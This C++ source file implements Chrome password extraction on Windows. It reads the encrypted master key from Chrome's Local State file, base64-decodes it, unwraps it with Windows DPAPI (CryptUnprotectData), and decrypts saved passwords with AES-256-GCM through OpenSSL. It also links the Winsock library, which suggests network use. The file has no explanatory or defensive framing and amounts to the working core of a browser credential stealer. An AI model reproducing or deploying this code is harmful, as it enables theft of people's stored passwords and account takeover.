#include "local.hpp"
#include <fstream>
#include <nlohmann/json.hpp>
#include <Windows.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "ws2_32.lib")
std::vector<uint8_t> chrome::get_key(const std::string config_file_path)
{
	std::ifstream config_file(config_file_path);
	nlohmann::json config;
	config_file >> config;
    std::vector<uint8_t> decoded = chrome::base64_decode(config["os_crypt"]["encrypted_key"]);
    std::vector<uint8_t> cut(decoded.size() - 5);
    std::memcpy(cut.data(), decoded.data() + 5, cut.size());
    std::vector<uint8_t> ret = chrome::win_decrypt(cut);
    return ret;
}

static unsigned int pos_of_char(const unsigned char chr)
{
    if (chr >= 'A' && chr <= 'Z') return chr - 'A';
    else if (chr >= 'a' && chr <= 'z') return chr - 'a' + ('Z' - 'A') + 1;
    else if (chr >= '0' && chr <= '9') return chr - '0' + ('Z' - 'A') + ('z' - 'a') + 2;
    else if (chr == '+' || chr == '-') return 62;
    else if (chr == '/' || chr == '_') return 63;
    else
        throw std::runtime_error("Input is not valid base64-encoded data.");
}

std::vector<uint8_t> chrome::base64_decode(std::string data)
{
	std::vector<uint8_t> ret;
    ret.reserve(data.length() / 4 * 3);
    size_t pos = 0;
    size_t length = data.length();
    while (pos < length)
    {
        size_t pos_of_char_1 = pos_of_char(data[pos + 1]);
        ret.push_back((pos_of_char(data[pos]) << 2) + ((pos_of_char_1 & 0x30) >> 4));
        if (pos + 2 < length)
        {
            unsigned int pos_of_char_2 = pos_of_char(data[pos + 2]);
            ret.push_back(((pos_of_char_1 & 0x0f) << 4) + ((pos_of_char_2 & 0x3c) >> 2));
            if (pos + 3 < length)
            {
                ret.push_back(((pos_of_char_2 & 0x03) << 6) + pos_of_char(data[pos + 3]));
            }
        }
        pos += 4;
    }
    return ret;
}

std::vector<uint8_t> chrome::win_decrypt(std::vector<uint8_t>& data)
{
    DATA_BLOB input, output;
    input.pbData = data.data();
    input.cbData = data.size();
    CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, NULL, &output);
    std::vector<uint8_t> ret(output.cbData);
    std:memcpy(ret.data(), output.pbData, output.cbData);
    LocalFree(output.pbData);
    return ret;
}

std::string chrome::password_decrypt(std::vector<uint8_t>& data, std::vector<uint8_t>& key)
{
    std::vector<uint8_t> iv(data.begin() + 3, data.begin() + 15);
    std::vector<uint8_t> password(data.begin() + 15, data.end() - 16);
    std::vector<uint8_t> decrypted_password(data.size());

    EVP_CIPHER_CTX* ctx;
    int len, plaintext;
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.size(), nullptr);
    EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data());
    EVP_DecryptUpdate(ctx, decrypted_password.data(), &len, password.data(), password.size());
    plaintext = len;
    EVP_DecryptFinal_ex(ctx, decrypted_password.data() + len, &len);
    plaintext += len;
    EVP_CIPHER_CTX_free(ctx);
    std::string ret(decrypted_password.begin(), decrypted_password.begin() + plaintext);
    return ret;
}